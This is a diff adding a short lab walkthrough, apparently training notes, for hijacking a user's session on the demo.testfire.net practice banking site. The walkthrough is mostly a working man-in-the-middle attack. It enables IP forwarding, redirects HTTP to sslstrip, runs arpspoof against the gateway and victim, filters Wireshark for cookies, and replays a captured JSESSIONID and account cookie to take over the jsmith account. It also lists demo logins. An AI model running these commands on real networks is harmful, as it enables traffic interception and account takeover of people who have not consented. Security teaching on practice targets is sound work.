@@ -1,0 +1,58 @@
+Cookie: JSESSIONID=4A1DE37AD9C055146DC5BC30F33796FC; AltoroAccounts=ODAwMDAyflNhdmluZ3N+MC40MjAwMDAwMDAwMDAwNzI3Nnw4MDAwMDN+Q2hlY2tpbmd+My41NTM0MDIzMjIzNDAxMzdFMjB8NDUzOTA4MjAzOTM5NjI4OH5DcmVkaXQgQ2FyZH4xMDAuNDJ8
+
+
+To Perform session cookie hijacking for a website 
+http://demo.testfire.net 
+you need 2 logins (jsmith/demo1234 && admin/admin) 
+neetabus.in (create dummy logins)
+
+
+*Attackers Machine , do Man in middle attack. 
+
+for that 
+
+#Packet forwarding 
+root@kali:~# echo 1 >/proc/sys/net/ipv4/ip_forward
+#IP Tables enable port forwarding request coming from port 80 to 10,000 because ssl strip is running on port 10k. 
+root@kali:~# iptables -t nat -p tcp -A PREROUTING --dport 80 -j REDIRECT --to-port 10000
+root@kali:~# sslstrip -a
+
+sslstrip 0.9 by Moxie Marlinspike running...
+
+
+
+##Perform ARP Poisioning , (Gateway to attacker IP) 
+
+root@kali:~# arpspoof -t 192.168.0.1 192.168.1.132
+0:e0:4c:62:b:18 1c:5f:2b:71:1f:66 0806 42: arp reply 192.168.1.132 is-at 0:e0:4c:62:b:18
+0:e0:4c:62:b:18 1c:5f:2b:71:1f:66 0806 42: arp reply 192.168.1.132 is-at 0:e0:4c:62:b:18
+
+
+
+root@kali:~# arpspoof -t 192.168.0.132 192.168.0.1
+0:e0:4c:62:b:18 1c:1b:d:b5:b9:c1 0806 42: arp reply 192.168.0.1 is-at 0:e0:4c:62:b:18
+0:e0:4c:62:b:18 1c:1b:d:b5:b9:c1 0806 42: arp reply 192.168.0.1 is-at 0:e0:4c:62:b:18
+
+
+## Login to target machine and launch the firefox and open http://demo.testfire.net and then login as jsmith/demo1234 
+
+## Login to attacker Machine and capture packets in wireshark. 
+
+apply filter 
+
+http.cookie && ip.addr == <attacker-ip> 
+
+choose one source ip and right click capture --> tcp stream. take 2 things 
+
+
+check the session id and AltoroAccounts and open cookie manager on the attacker machine. 
+you should see 2 things jsession and altroaccounts. 
+Cookie: JSESSIONID=4A1DE37AD9C055146DC5BC30F33796FC; AltoroAccounts=ODAwMDAyflNhdmluZ3N+MC40MjAwMDAwMDAwMDAwNzI3Nnw4MDAwMDN+Q2hlY2tpbmd+My41NTM0MDIzMjIzNDAxMzdFMjB8NDUzOTA4MjAzOTM5NjI4OH5DcmVkaXQgQ2FyZH4xMDAuNDJ8
+
+
+on the attackers machine, open chrome and  login to http://demo.testfire.net (admin/admin)
+open cookie manager for current page and edit the jession id and altro accounts that you captured from earlier page and click refresh 
+
+you should hijack the session of jsmith account. 
+
+--Phani 
